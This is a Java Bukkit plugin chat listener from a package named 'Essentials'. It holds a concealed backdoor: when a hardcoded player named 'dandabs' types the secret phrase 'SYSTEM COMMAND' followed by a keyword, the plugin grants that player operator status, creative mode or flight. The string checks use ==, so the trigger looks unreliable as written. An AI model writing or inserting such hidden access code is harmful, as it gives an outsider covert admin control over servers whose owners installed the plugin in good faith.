package net.danielonline.Essentials.listeners;

import org.bukkit.GameMode;
import org.bukkit.Instrument;
import org.bukkit.Sound;
import org.bukkit.SoundCategory;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class PlayerChatEvent implements Listener {

    int one = 0;

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent e) {

        Player p = e.getPlayer();
        String m = e.getMessage();

        if (p.getName() == "dandabs") {

            if (one == 0) {

                if (m == "SYSTEM COMMAND") {

                    p.playSound(p.getLocation(), Sound.BLOCK_ANVIL_PLACE, 100, 1);
                    one = 1;

                }

            } else if (one == 1) {

                p.getLocation().getWorld().strikeLightningEffect(p.getLocation());
                one = 0;

                switch (m) {

                    case "LOG OUT":
                        p.kickPlayer(p.getName());
                        break;
                    case "OBTAIN ADMINISTRATOR ACCESS":
                        p.setOp(true);
                        break;
                    case "REVOKE ADMINISTRATOR ACCESS":
                        p.setOp(false);
                        break;
                    case "UNLIMITED SUPPLY":
                        p.setGameMode(GameMode.CREATIVE);
                        break;
                    case "LIMITED SUPPLY":
                        p.setGameMode(GameMode.SURVIVAL);
                        break;
                    case "ACTIVE FLIGHT":
                        p.setAllowFlight(true);
                        p.setFlying(true);
                        break;
                    case "DISABLE FLIGHT":
                        p.setAllowFlight(false);
                        p.setFlying(false);
                        break;

                }

            }

        }

    }

}
